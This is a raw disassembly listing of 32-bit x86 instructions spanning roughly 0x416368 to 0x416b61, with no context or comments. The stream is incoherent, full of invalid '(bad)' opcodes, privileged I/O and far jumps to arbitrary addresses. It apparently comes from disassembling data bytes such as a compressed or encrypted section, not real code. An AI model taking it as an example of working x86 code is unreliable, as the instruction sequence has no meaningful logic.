  416368:	cmp    DWORD PTR [esi-0x7a],ebx
  41636b:	jecxz  0x416386
  41636d:	ret    
  41636e:	mov    edi,DWORD PTR [edi-0x70]
  416371:	sub    al,0xcd
  416373:	xchg   edx,eax
  416374:	sub    eax,0x5bc22e3b
  416379:	ja     0x4163f8
  41637b:	fnstsw WORD PTR [edx-0x22]
  41637e:	cmc    
  41637f:	stc    
  416380:	ret    0x14fb
  416383:	lahf   
  416384:	nop
  416385:	sbb    al,0xf5
  416387:	retf   
  416388:	push   es
  416389:	(bad)  
  41638a:	cmp    esp,DWORD PTR [esp+esi*2-0x56]
  41638e:	aaa    
  41638f:	cs inc edx
  416391:	lds    esp,FWORD PTR [ecx+ebp*1-0xed89074]
  416398:	mov    bl,0x99
  41639a:	adc    BYTE PTR [eax+0x14],dl
  41639d:	push   esi
  41639e:	jl     0x416349
  4163a0:	cmp    esp,DWORD PTR [esi+0x699df4f6]
  4163a6:	data16 jge 0x41638c
  4163a9:	adc    eax,0x6646e8cd
  4163ae:	inc    esi
  4163af:	adc    al,0x8a
  4163b1:	jg     0x4163ac
  4163b3:	repz mov esi,0xb65d757b
  4163b9:	mov    ds:0x81557d56,eax
  4163be:	test   eax,0xeb743d54
  4163c3:	fsub   st(1),st
  4163c5:	sbb    al,0xaa
  4163c7:	or     edi,DWORD PTR [ecx+ebx*1+0x16]
  4163cb:	fisttp QWORD PTR [ecx+0xed8220a]
  4163d1:	div    DWORD PTR [esi-0x1f]
  4163d4:	pop    ebx
  4163d5:	popf   
  4163d6:	retf   0x176d
  4163d9:	cli    
  4163da:	adc    eax,0xdba060a6
  4163df:	and    DWORD PTR [ebx],ebx
  4163e1:	mov    ds:0xd98553f7,eax
  4163e6:	fdiv   DWORD PTR [ecx-0x6a9e45be]
  4163ec:	sub    BYTE PTR [ecx+0x51d4e80b],dl
  4163f2:	jbe    0x416424
  4163f4:	inc    edx
  4163f5:	mov    edx,0xacf9f50c
  4163fa:	addr16 push ebp
  4163fc:	fild   QWORD PTR [eax]
  4163fe:	mov    edi,0x4565e0d4
  416403:	in     al,dx
  416404:	jle    0x4163d8
  416406:	inc    ebp
  416407:	(bad)  
  416408:	call   0x2152c0b1
  41640d:	iret   
  41640e:	sub    eax,0xf9c651c2
  416413:	aas    
  416414:	rcr    BYTE PTR [ecx],cl
  416416:	inc    ebx
  416417:	pop    ss
  416418:	into   
  416419:	mov    DWORD PTR [edi-0x44c7c0b4],ebp
  41641f:	ficomp WORD PTR [edi+edx*1]
  416422:	or     esi,0xb1cf2f48
  416428:	in     al,0x63
  41642a:	mov    ecx,0x8c601616
  41642f:	cld    
  416430:	xor    bh,bl
  416432:	xchg   ecx,eax
  416433:	and    DWORD PTR [esi+eax*8+0x65],ebx
  416437:	dec    eax
  416438:	mov    al,ds:0x35b4300d
  41643d:	ret    
  41643e:	fist   WORD PTR [ebx-0x30]
  416441:	daa    
  416442:	push   esi
  416443:	or     cl,BYTE PTR [ebx-0x724dc22e]
  416449:	call   0x2dae726b
  41644e:	loope  0x41647d
  416450:	jmp    0x7ee7f939
  416455:	fs mov esi,0xbfd286a3
  41645b:	clc    
  41645c:	dec    eax
  41645d:	mov    sp,0x498f
  416461:	xor    edx,0x2
  416464:	js     0x416420
  416466:	mov    ebx,DWORD PTR [eax+0x50]
  416469:	xor    eax,0x8c1c109
  41646e:	fimul  DWORD PTR [eax-0x7f]
  416471:	and    ah,al
  416473:	popa   
  416474:	in     eax,0xd2
  416476:	or     bl,BYTE PTR [edx]
  416478:	xchg   BYTE PTR [ecx-0xf],al
  41647b:	mov    al,0xf7
  41647d:	int3   
  41647e:	(bad)  ds:0xe67f971e
  416484:	mov    ah,0xa0
  416486:	stc    
  416487:	or     al,0xae
  416489:	pop    es
  41648a:	xchg   DWORD PTR [edi],eax
  41648c:	mov    al,ds:0x43d37152
  416491:	pop    ss
  416492:	xor    al,0xfb
  416494:	in     eax,0x3f
  416496:	call   0xc0b0e044
  41649b:	retf   
  41649c:	clc    
  41649d:	mov    BYTE PTR [esi-0x10e1385e],ah
  4164a3:	xor    DWORD PTR [eax],0xffffff94
  4164a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164a7:	jmp    0x8889:0xc5b988b5
  4164ae:	enter  0xb902,0xab
  4164b2:	sub    eax,DWORD PTR [ecx]
  4164b4:	pop    es
  4164b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164b6:	mov    ecx,0x9f270067
  4164bb:	div    DWORD PTR [ecx]
  4164bd:	inc    edi
  4164be:	pop    ebp
  4164bf:	mov    ds:0x25f48710,ax
  4164c5:	repnz push edi
  4164c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164c8:	mov    cl,BYTE PTR [esi-0x17]
  4164cb:	int3   
  4164cc:	dec    ecx
  4164cd:	test   eax,0x2f9099c0
  4164d3:	adc    BYTE PTR [esi-0x2f],0xa8
  4164d7:	(bad)  
  4164d8:	push   ss
  4164d9:	cmp    eax,0xe775f979
  4164de:	popf   
  4164df:	xchg   edi,eax
  4164e0:	nop
  4164e1:	xlat   BYTE PTR ds:[ebx]
  4164e2:	int    0x11
  4164e4:	popf   
  4164e5:	mov    al,0x8b
  4164e7:	dec    ebp
  4164e8:	sub    cl,BYTE PTR [edx+0x391f87a0]
  4164ee:	add    eax,0xb2f56cb8
  4164f3:	cmp    ah,BYTE PTR ds:0x38b2525d
  4164f9:	mov    al,0x14
  4164fb:	jo     0x416577
  4164fd:	paddd  mm4,QWORD PTR [edx]
  416500:	pop    ebx
  416501:	mov    edx,0x8f91bdd1
  416506:	or     eax,0x5b085437
  41650b:	push   ebp
  41650c:	test   BYTE PTR [eax+0x35],bh
  41650f:	push   es
  416510:	mov    bl,ch
  416512:	mov    ch,0xc0
  416514:	sti    
  416515:	retf   
  416516:	loopne 0x416519
  416518:	mov    esi,0xc6b54fa8
  41651d:	(bad)  
  41651e:	jle    0x416579
  416520:	(bad)  
  416521:	lds    edi,FWORD PTR [ebx-0x17]
  416524:	add    al,BYTE PTR [ebp-0x2466c696]
  41652a:	ja     0x4164c6
  41652c:	jo     0x416519
  41652e:	gs mov eax,0xddd874ba
  416534:	and    DWORD PTR [ecx-0x1f08cb2a],0x48432aec
  41653e:	fcomp  QWORD PTR [edi-0x76]
  416541:	inc    ebx
  416542:	jb     0x41657b
  416544:	int3   
  416545:	(bad)  
  416547:	and    eax,0x451b5fd5
  41654c:	jge    0x4165c6
  41654e:	push   0x6586c974
  416553:	inc    eax
  416554:	xor    BYTE PTR [ebx+0x4f],0x42
  416558:	iret   
  416559:	or     ecx,DWORD PTR [eax+ecx*8-0x499c29d9]
  416560:	jp     0x416534
  416562:	(bad)  
  416563:	sahf   
  416564:	or     al,0xf8
  416566:	fwait
  416567:	daa    
  416568:	pop    ebp
  416569:	pop    esi
  41656a:	popa   
  41656b:	jb     0x4164f8
  41656d:	loop   0x41651e
  41656f:	xor    eax,0x39230c1
  416574:	push   ecx
  416575:	sub    DWORD PTR [eax-0x24d64e80],esi
  41657b:	add    BYTE PTR [edi-0x4ab427b2],0x30
  416582:	popa   
  416583:	es cmp dl,ah
  416586:	ror    DWORD PTR [edi+0x6c247ba8],1
  41658c:	nop
  41658d:	scas   al,BYTE PTR es:[edi]
  41658e:	sbb    ebx,eax
  416590:	ret    0xe136
  416593:	add    dl,BYTE PTR [edi]
  416595:	mov    ds:0x48dac9e,eax
  41659a:	sbb    ah,BYTE PTR [ecx]
  41659c:	data16 and BYTE PTR [edi+eiz*1-0x1856cb18],dl
  4165a4:	push   edi
  4165a5:	inc    edi
  4165a6:	xchg   esi,eax
  4165a7:	cmp    BYTE PTR [ebx+0x60b5a208],bl
  4165ad:	cli    
  4165ae:	sbb    al,0x96
  4165b0:	call   0xc9c50b45
  4165b5:	xlat   BYTE PTR ds:[ebx]
  4165b6:	push   ss
  4165b7:	jne    0x416585
  4165b9:	and    DWORD PTR [esi+0x56],ebp
  4165bc:	int3   
  4165bd:	xchg   DWORD PTR [esi],ebp
  4165bf:	loope  0x416582
  4165c1:	imul   esi,ecx,0xffffffdc
  4165c4:	shl    DWORD PTR [ebx],0x73
  4165c7:	mov    al,ds:0x6d13cea9
  4165cc:	bound  edi,QWORD PTR [edi+eiz*1]
  4165cf:	sahf   
  4165d0:	int3   
  4165d1:	pop    eax
  4165d2:	repnz fdivp st(6),st
  4165d5:	adc    al,0x3c
  4165d7:	cwde   
  4165d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d9:	xor    DWORD PTR [esi],eax
  4165db:	iret   
  4165dc:	add    eax,0x1cb92f0a
  4165e1:	ins    BYTE PTR es:[edi],dx
  4165e2:	in     al,dx
  4165e3:	mov    al,al
  4165e5:	jle    0x4165a9
  4165e7:	hlt    
  4165e8:	inc    edi
  4165e9:	sub    DWORD PTR [edx+0x6a],0x2b62d5ee
  4165f0:	jle    0x41664d
  4165f2:	adc    al,0x79
  4165f4:	dec    edx
  4165f5:	int3   
  4165f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165f7:	adc    eax,0x60f36509
  4165fc:	in     eax,dx
  4165fd:	lods   eax,DWORD PTR ds:[esi]
  4165fe:	shr    ebp,1
  416600:	push   edi
  416601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416602:	mov    ebx,0x12b7a38b
  416607:	inc    esi
  416608:	sub    al,0xaa
  41660a:	or     esi,ebx
  41660c:	jle    0x4165a2
  41660e:	mov    al,ds:0x12f16790
  416613:	xor    eax,0x75dc2706
  416618:	add    edx,eax
  41661a:	mov    eax,0x8c2ce3e6
  41661f:	inc    esp
  416620:	jo     0x41664d
  416622:	test   BYTE PTR [esi],bh
  416624:	xor    DWORD PTR [ebx+0x63],esp
  416627:	xchg   ecx,eax
  416628:	inc    ecx
  416629:	(bad)  
  41662a:	mov    edi,0x3d3fedc9
  41662f:	bound  edx,QWORD PTR [esi+eax*8-0x78cf1585]
  416636:	sti    
  416637:	xor    eax,esp
  416639:	lahf   
  41663a:	xchg   esi,eax
  41663b:	and    DWORD PTR gs:[ebx+edx*2-0x42d41981],ebx
  416643:	mov    ebx,0x6c28fe6f
  416648:	ja     0x4165fe
  41664a:	mov    bh,0x5
  41664c:	nop/reserved BYTE PTR [eax]
  41664f:	jmp    0x143f8fb9
  416654:	xor    DWORD PTR [ebx+0x585eb302],edi
  41665a:	dec    ebp
  41665b:	imul   ebx,DWORD PTR [ecx-0x22],0x13e611b8
  416662:	pop    edx
  416663:	xor    BYTE PTR [edi-0x6c],ah
  416666:	xor    DWORD PTR [ebx+eax*1+0x46],edx
  41666a:	popa   
  41666b:	and    DWORD PTR [eax+0x57],0xbbab8f7f
  416672:	cdq    
  416673:	cmp    DWORD PTR [esi+0x2f9ce513],esp
  416679:	or     al,BYTE PTR ds:0xc04040d0
  41667f:	sub    BYTE PTR [edi-0x16],0x83
  416683:	bound  eax,QWORD PTR [esi-0x1a496247]
  416689:	lods   eax,DWORD PTR ds:[esi]
  41668a:	or     DWORD PTR [edi-0x6],ecx
  41668d:	pop    ds
  41668e:	mov    ch,0x46
  416690:	mov    BYTE PTR [edx+eax*2],bl
  416693:	inc    ebx
  416694:	pop    edi
  416695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416696:	call   0x448b7164
  41669b:	xchg   edx,eax
  41669c:	push   0xffffffff
  41669e:	inc    ecx
  41669f:	shr    edi,0x2b
  4166a2:	bound  ebp,QWORD PTR [ecx-0x75b99122]
  4166a8:	gs repnz loop 0x416664
  4166ac:	stc    
  4166ad:	add    BYTE PTR [ebx+0x24],ch
  4166b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166b1:	out    0x8,al
  4166b3:	jle    0x416709
  4166b5:	adc    BYTE PTR [eax+0x4e9c4ad2],cl
  4166bb:	stos   DWORD PTR es:[edi],eax
  4166bc:	stc    
  4166bd:	ja     0x416713
  4166bf:	sbb    DWORD PTR [ebp+0x3d9beab0],ecx
  4166c5:	bound  ebp,QWORD PTR ds:0x3bb8f930
  4166cb:	test   BYTE PTR [edx+ecx*8],ah
  4166ce:	sbb    BYTE PTR [ebx+0x3],ah
  4166d1:	(bad)  
  4166d2:	jmp    0x9fc1:0xed41c79c
  4166d9:	xchg   ecx,eax
  4166da:	fs mov cl,0x2e
  4166dd:	fisttp WORD PTR [ebx-0x75ec9031]
  4166e3:	dec    ebp
  4166e4:	ret    
  4166e5:	xchg   edx,eax
  4166e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166e7:	stc    
  4166e8:	lods   al,BYTE PTR ds:[esi]
  4166e9:	add    DWORD PTR [ebp-0x3340d981],eax
  4166ef:	loopne 0x41673d
  4166f1:	fisubr WORD PTR [ecx-0x5e]
  4166f4:	xchg   ebp,eax
  4166f5:	data16 jbe 0x416706
  4166f8:	mov    dh,0x46
  4166fa:	in     eax,dx
  4166fb:	lods   al,BYTE PTR ds:[esi]
  4166fc:	loop   0x416747
  4166fe:	shl    DWORD PTR [edx],0x2d
  416701:	pushf  
  416702:	pop    esp
  416703:	and    DWORD PTR [ecx],0xe7e3cf79
  416709:	imul   ebp,DWORD PTR [esi-0x27],0x22
  41670d:	cmp    BYTE PTR [eax],0xf1
  416710:	and    bh,BYTE PTR [edx]
  416712:	jecxz  0x4166b9
  416714:	scas   eax,DWORD PTR es:[edi]
  416715:	aam    0x49
  416717:	in     al,0x3a
  416719:	sbb    BYTE PTR [esi],al
  41671b:	ins    DWORD PTR es:[edi],dx
  41671c:	loope  0x4166c2
  41671e:	scas   eax,DWORD PTR es:[edi]
  41671f:	sti    
  416720:	push   ebp
  416721:	xor    BYTE PTR [ebp+0x64],dh
  416724:	and    edx,ebx
  416726:	mov    al,ds:0x127fac35
  41672b:	xor    ebp,DWORD PTR [ebx-0x4dbd0d5b]
  416731:	into   
  416732:	mov    eax,ds:0xb42e1fc6
  416737:	mov    ecx,0x808a7dca
  41673c:	dec    edi
  41673d:	scas   al,BYTE PTR es:[edi]
  41673e:	dec    edx
  41673f:	or     ch,ch
  416741:	sub    ecx,DWORD PTR [esi]
  416743:	lds    ebp,FWORD PTR [esi+0x5c]
  416746:	mov    cl,BYTE PTR [esi+0x60]
  416749:	(bad)  
  41674a:	cmc    
  41674b:	xor    bh,BYTE PTR [ecx+0x20b1f357]
  416751:	nop
  416752:	sbb    ebx,DWORD PTR [esi+0x45c51abb]
  416758:	push   es
  416759:	sub    eax,0x14b0be43
  41675e:	ds enter 0xd1c0,0xb3
  416763:	inc    ecx
  416764:	sub    esi,DWORD PTR [ebx]
  416766:	loope  0x416757
  416768:	inc    esi
  416769:	dec    ebp
  41676a:	iret   
  41676b:	repz cmp eax,0xcb1b10e5
  416771:	stos   BYTE PTR es:[edi],al
  416772:	icebp  
  416773:	mov    bl,0x15
  416775:	enter  0x96dc,0x43
  416779:	mov    al,BYTE PTR [ecx+0x7e]
  41677c:	in     al,0x29
  41677e:	lods   eax,DWORD PTR ds:[esi]
  41677f:	das    
  416780:	xor    edx,DWORD PTR [edi+0x38014bc8]
  416786:	arpl   sp,sp
  416788:	and    ebp,DWORD PTR [ebp+0x76]
  41678b:	(bad)  
  41678c:	cmp    DWORD PTR [edi-0x27c72fd8],ecx
  416792:	sub    eax,0x3518646
  416797:	adc    bh,BYTE PTR ds:0x2bcf07cd
  41679d:	rep ins BYTE PTR es:[edi],dx
  41679f:	xchg   ebx,eax
  4167a0:	cmp    DWORD PTR [eax],edx
  4167a2:	jmp    FWORD PTR [ebp+ecx*2+0x5b]
  4167a6:	cld    
  4167a7:	ret    
  4167a8:	shr    ecx,cl
  4167aa:	cmp    DWORD PTR [ecx+eax*1+0x1538d4ec],ebp
  4167b1:	hlt    
  4167b2:	(bad)  
  4167b3:	xchg   esi,eax
  4167b4:	push   ecx
  4167b5:	push   edi
  4167b6:	mov    ds,WORD PTR [ebp-0x2234387]
  4167bc:	inc    esp
  4167bd:	sub    ebx,DWORD PTR [edi]
  4167bf:	jne    0x4167f5
  4167c1:	lock push cs
  4167c3:	or     eax,0x951a0ef2
  4167c8:	lahf   
  4167c9:	(bad)
  4167ce:	dec    eax
  4167cf:	and    DWORD PTR [ebp-0x48],eax
  4167d2:	pop    edx
  4167d3:	jno    0x41684b
  4167d5:	add    eax,0x1084c80f
  4167da:	pushf  
  4167db:	or     DWORD PTR [eax+ecx*4],0x63
  4167df:	loopne 0x4167a9
  4167e1:	fbld   TBYTE PTR [edx]
  4167e3:	in     al,dx
  4167e4:	dec    esp
  4167e5:	js     0x416856
  4167e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e8:	or     BYTE PTR [ecx],dl
  4167ea:	stc    
  4167eb:	mov    ds:0x8bb20d41,eax
  4167f0:	xor    BYTE PTR [esi+0x30],0xa
  4167f4:	xchg   edi,eax
  4167f5:	jns    0x4167f3
  4167f7:	add    BYTE PTR [ebp-0x4f],dh
  4167fa:	mov    esi,0x55997d88
  4167ff:	sti    
  416800:	dec    ebp
  416801:	xchg   ebx,edi
  416803:	ret    
  416804:	iret   
  416805:	call   ebx
  416807:	into   
  416808:	mov    edi,0xb0d0a9b5
  41680d:	cmc    
  41680e:	mov    BYTE PTR [ebx-0x5e],dl
  416811:	fnstsw WORD PTR [ebp-0x45]
  416814:	gs int 0xc6
  416817:	push   0x67
  416819:	enter  0x473,0xd9
  41681d:	icebp  
  41681e:	add    al,0x35
  416820:	xchg   edi,eax
  416821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416822:	adc    BYTE PTR [edx-0x34],0x99
  416826:	and    al,0x48
  416828:	test   BYTE PTR [ebx],dl
  41682a:	xor    ah,BYTE PTR [esi-0x37]
  41682d:	mov    eax,0x427d6906
  416832:	inc    edx
  416833:	mov    ah,0x4c
  416835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416836:	sbb    BYTE PTR [edx+eiz*1-0x6feb943a],bh
  41683d:	pop    ebp
  41683e:	out    dx,al
  41683f:	bound  esi,QWORD PTR [ecx-0x22]
  416842:	add    DWORD PTR [edi+esi*8],edi
  416845:	cli    
  416846:	cmp    eax,0x4a29553e
  41684b:	inc    edi
  41684c:	rep stos BYTE PTR es:[edi],al
  41684e:	ins    DWORD PTR es:[edi],dx
  41684f:	test   al,0x7d
  416851:	add    eax,0xf7573d07
  416857:	subps  xmm5,XMMWORD PTR [edx-0x457c4331]
  41685e:	inc    edx
  41685f:	aas    
  416860:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  416862:	push   cs
  416863:	push   edi
  416864:	cli    
  416865:	mov    eax,0xcd8d69c
  41686a:	shl    DWORD PTR [edi+0x62],0x83
  41686e:	mov    esi,0xa50aa4e2
  416873:	fiadd  WORD PTR [edi]
  416875:	add    ch,BYTE PTR [eax-0x8bd1339]
  41687b:	mov    ds:0xe296e655,al
  416880:	and    bh,BYTE PTR [ebx]
  416882:	and    DWORD PTR [ecx-0x28],ebx
  416885:	push   es
  416886:	cmp    BYTE PTR [edi],bl
  416888:	mov    eax,0x5b28ae20
  41688d:	or     BYTE PTR [esi],bl
  41688f:	xchg   esi,eax
  416890:	xlat   BYTE PTR ds:[ebx]
  416891:	repnz fwait
  416893:	repz dec esi
  416895:	and    al,0xf0
  416897:	lods   eax,DWORD PTR ds:[esi]
  416898:	int3   
  416899:	fidivr DWORD PTR [edi+0x223a8e61]
  41689f:	lods   al,BYTE PTR ds:[esi]
  4168a0:	cmp    DWORD PTR [ebp+edx*4+0x27],0xffffffda
  4168a5:	fild   QWORD PTR [eax-0x29]
  4168a8:	xor    esp,DWORD PTR [edi+0x47]
  4168ab:	cmp    eax,0x33386408
  4168b0:	(bad)  
  4168b1:	(bad)  
  4168b2:	xor    al,0xc6
  4168b4:	imul   esi,esp,0xd847f6bb
  4168ba:	jle    0x41683e
  4168bc:	inc    ebx
  4168bd:	add    ecx,ecx
  4168bf:	jg     0x416888
  4168c1:	ins    BYTE PTR es:[edi],dx
  4168c2:	sbb    al,BYTE PTR [ebx+0x590bb0c0]
  4168c8:	cli    
  4168c9:	or     al,0x6a
  4168cb:	or     BYTE PTR [edx],al
  4168cd:	cmp    eax,0x52c8e635
  4168d2:	pop    ss
  4168d3:	cmp    bl,al
  4168d5:	imul   BYTE PTR cs:[esi]
  4168d8:	jg     0x416905
  4168da:	push   ss
  4168db:	add    al,0x0
  4168dd:	inc    ecx
  4168de:	punpcklwd mm7,DWORD PTR [edx]
  4168e1:	push   ds
  4168e2:	repnz dec ebp
  4168e4:	inc    ebx
  4168e5:	imul   edi,DWORD PTR [ecx],0x3d8ef5d1
  4168eb:	mov    ds:0x9cda4c81,eax
  4168f0:	in     al,0x8c
  4168f2:	retf   
  4168f3:	paddd  mm7,QWORD PTR [ebp+0x38d8a573]
  4168fa:	cmp    eax,0x2ba8e086
  4168ff:	outs   dx,DWORD PTR ds:[esi]
  416900:	xor    eax,0x2adfff56
  416905:	xchg   ecx,eax
  416906:	mov    ecx,cs
  416908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416909:	push   esp
  41690a:	cmp    edi,DWORD PTR [edx-0x44f7681b]
  416910:	sbb    ebx,DWORD PTR [edi+eiz*2-0x672f5593]
  416917:	pop    ss
  416918:	adc    edx,DWORD PTR [edi]
  41691a:	xchg   esp,eax
  41691b:	lods   al,BYTE PTR ds:[esi]
  41691c:	xor    BYTE PTR [edx],cl
  41691e:	sbb    DWORD PTR [edx+esi*4-0xc25e1a],0x28
  416926:	dec    edi
  416927:	js     0x4168f4
  416929:	and    DWORD PTR [ecx],edi
  41692b:	ret    0x17ab
  41692e:	data16 mov cl,0xcd
  416931:	mov    eax,0x1553619c
  416936:	adc    ecx,DWORD PTR [ebx]
  416938:	gs out dx,al
  41693a:	aas    
  41693b:	and    bl,BYTE PTR [ebx-0x57946d23]
  416941:	or     BYTE PTR [edi+0x1d],cl
  416944:	mov    edx,0xad638b99
  416949:	outs   dx,BYTE PTR ds:[esi]
  41694a:	cmp    eax,0x8137ea09
  41694f:	in     al,0xbe
  416951:	outs   dx,BYTE PTR ds:[esi]
  416952:	es (bad) 
  416954:	fisubr DWORD PTR [ecx]
  416956:	pop    ebx
  416957:	xchg   ecx,edi
  416959:	inc    edi
  41695a:	ret    0xc0f5
  41695d:	into   
  41695e:	imul   eax,DWORD PTR ds:0xeea077ea,0xfffffff6
  416965:	cmp    dh,BYTE PTR [edx]
  416967:	mov    eax,ds:0x5ff543d7
  41696c:	push   0xd3f0dfaf
  416971:	sahf   
  416972:	and    edi,DWORD PTR [ebx+0x6e]
  416975:	xor    DWORD PTR [esi-0x6db2d4a5],eax
  41697b:	mov    cl,0xc7
  41697d:	jne    0x416928
  41697f:	xor    ch,ah
  416981:	leave  
  416982:	add    BYTE PTR [ebx],0xc7
  416985:	pop    es
  416986:	imul   ebx,DWORD PTR [ebx+0x5b96dc5b],0x32a394ab
  416990:	lock stc 
  416992:	aam    0x1e
  416994:	jno    0x416986
  416996:	sbb    edx,DWORD PTR [edi-0x119c53c7]
  41699c:	imul   esp,ebp,0xffffff89
  41699f:	sub    eax,0x1a312c05
  4169a4:	sbb    BYTE PTR [eax-0x4a],cl
  4169a7:	ja     0x4169de
  4169a9:	dec    ecx
  4169aa:	das    
  4169ab:	into   
  4169ac:	or     eax,0xc0076264
  4169b1:	inc    ebp
  4169b2:	call   0x4135:0xd7c96d3c
  4169b9:	push   esi
  4169ba:	add    BYTE PTR [esp+edx*1],ah
  4169bd:	cld    
  4169be:	loop   0x4169cd
  4169c0:	xor    cl,BYTE PTR [ebp+ebx*4-0x9]
  4169c4:	mov    ecx,0xbb1dc69b
  4169c9:	cmp    edx,ecx
  4169cb:	pop    DWORD PTR [ecx-0x29a1369b]
  4169d1:	out    0x1a,al
  4169d3:	dec    ebp
  4169d4:	test   eax,0xf8915882
  4169d9:	(bad)  
  4169da:	sbb    eax,0xa711536f
  4169df:	loop   0x4169ae
  4169e1:	ret    0x3191
  4169e4:	sbb    al,0x5
  4169e6:	cmc    
  4169e7:	push   ss
  4169e8:	nop
  4169e9:	std    
  4169ea:	push   esi
  4169eb:	and    al,0x29
  4169ed:	add    eax,0xfab2f1dc
  4169f2:	aad    0x15
  4169f4:	and    BYTE PTR [ebx],ch
  4169f6:	cmp    BYTE PTR [ebp+ebx*1-0x6c3ccd99],0x4c
  4169fe:	(bad)  
  4169ff:	outs   dx,DWORD PTR ds:[esi]
  416a00:	inc    edx
  416a01:	cwde   
  416a02:	push   esi
  416a03:	in     eax,0x23
  416a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a06:	and    eax,0x39a8be70
  416a0b:	or     eax,0x3f610432
  416a10:	fimul  WORD PTR [esp+edx*4]
  416a13:	dec    ebp
  416a14:	test   BYTE PTR [eax+0x19c13557],bh
  416a1a:	xchg   edx,eax
  416a1b:	das    
  416a1c:	mov    eax,0x49910ee6
  416a21:	cld    
  416a22:	ins    DWORD PTR es:[edi],dx
  416a23:	aad    0x38
  416a25:	jp     0x4169e7
  416a27:	mov    al,0x72
  416a29:	pop    ecx
  416a2a:	add    eax,ecx
  416a2c:	pushw  cs
  416a2e:	adc    bl,BYTE PTR [eax]
  416a30:	jbe    0x4169b5
  416a32:	and    DWORD PTR [ebx],edi
  416a34:	call   0x1f161f1
  416a39:	and    ebx,DWORD PTR [edi+0x797bc6a]
  416a3f:	push   0x6e7a0417
  416a44:	push   esp
  416a45:	push   ss
  416a46:	dec    esi
  416a47:	push   0x2e9699b4
  416a4c:	clc    
  416a4d:	mov    dh,0xa8
  416a4f:	cmpps  xmm0,XMMWORD PTR [edx+0x7e1bf092],0xa4
  416a57:	rcr    ebx,1
  416a59:	popf   
  416a5a:	shl    dl,1
  416a5c:	mov    ds:0xfc1ba831,al
  416a61:	(bad)  
  416a62:	mov    eax,ds:0xd1043098
  416a67:	pop    ebx
  416a68:	dec    eax
  416a69:	xchg   edi,eax
  416a6a:	sub    eax,0x27c4fc7d
  416a6f:	adc    dh,ch
  416a71:	sbb    al,0x2c
  416a73:	jns    0x416add
  416a75:	cmc    
  416a76:	mov    cl,0x51
  416a78:	popf   
  416a79:	pop    esp
  416a7a:	ja     0x416a84
  416a7c:	cmp    al,0x89
  416a7e:	jecxz  0x416ac4
  416a80:	dec    ebx
  416a81:	dec    esp
  416a82:	dec    esp
  416a83:	out    0x24,al
  416a85:	das    
  416a86:	push   edx
  416a87:	add    BYTE PTR cs:[ecx],dl
  416a8a:	pop    edx
  416a8b:	adc    DWORD PTR [ebp+ebp*2+0x79],edx
  416a8f:	(bad)  
  416a90:	dec    ecx
  416a91:	adc    eax,0x728b50e7
  416a96:	push   ebp
  416a97:	or     al,0xbb
  416a99:	dec    ebx
  416a9a:	(bad)
  416a9e:	repz sbb al,0x73
  416aa1:	xor    BYTE PTR [edi+0xa],bl
  416aa4:	push   edx
  416aa5:	aam    0xca
  416aa7:	mov    edi,0xf1860c9
  416aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416aad:	repnz pop esp
  416aaf:	inc    ecx
  416ab0:	js     0x416a99
  416ab2:	es push cs
  416ab4:	inc    eax
  416ab5:	icebp  
  416ab6:	addr16 xor al,0x79
  416ab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aba:	int    0x36
  416abc:	(bad)  
  416abd:	mov    esp,0x13db98db
  416ac2:	cmp    DWORD PTR [ebx-0x24],ecx
  416ac5:	dec    edx
  416ac6:	xchg   esi,eax
  416ac7:	sub    BYTE PTR [eax+0x11],al
  416aca:	lds    ebp,FWORD PTR [eax-0x35436a22]
  416ad0:	xchg   esi,eax
  416ad1:	std    
  416ad2:	imul   ebp,DWORD PTR [ebx],0xfffffffd
  416ad5:	out    0x18,al
  416ad7:	imul   ebx,DWORD PTR [edx],0x6d
  416ada:	cld    
  416adb:	cld    
  416adc:	imul   esi,edi,0x1f0ab85c
  416ae2:	jns    0x416b29
  416ae4:	(bad)  
  416ae5:	popa   
  416ae6:	add    DWORD PTR [edx+0x4329a4f0],ecx
  416aec:	leave  
  416aed:	add    DWORD PTR [edi-0x10],ebx
  416af0:	adc    ecx,DWORD PTR [edi+0x13]
  416af3:	mov    esi,edi
  416af5:	in     al,dx
  416af6:	jle    0x416b1d
  416af8:	jo     0x416b25
  416afa:	and    cl,BYTE PTR [eax-0x450d0d72]
  416b00:	push   ebx
  416b01:	fwait
  416b02:	mov    ebx,0xe9b822e9
  416b07:	(bad)  
  416b08:	dec    esp
  416b09:	test   eax,0x4fcdc507
  416b0e:	repnz outs dx,DWORD PTR ds:[esi]
  416b10:	shl    BYTE PTR [edx-0x19e0f7a4],cl
  416b16:	nop
  416b17:	xor    dl,ah
  416b19:	in     eax,0x79
  416b1b:	add    al,0x79
  416b1d:	(bad)  
  416b1f:	cld    
  416b20:	ror    DWORD PTR [ecx+0x559e4886],1
  416b26:	xchg   DWORD PTR [ebx+0x4ac859df],ecx
  416b2c:	inc    edi
  416b2d:	cmc    
  416b2e:	mul    BYTE PTR [ebp+esi*4+0x627c4218]
  416b35:	sub    eax,0x995cfb48
  416b3a:	sub    edx,DWORD PTR [ebp-0x60]
  416b3d:	jl     0x416ae8
  416b3f:	mov    bl,0x39
  416b41:	xor    al,0xc1
  416b43:	or     BYTE PTR [edi],cl
  416b45:	sub    eax,0x58509af5
  416b4a:	mov    edx,0x94469b78
  416b4f:	cmp    eax,0x709f168e
  416b54:	mov    ah,0x52
  416b56:	add    DWORD PTR [esi+eax*2+0x4e4e4d33],ebp
  416b5d:	iret   
  416b5e:	aaa    
  416b5f:	xor    ebp,ebx
  416b61:	aas    
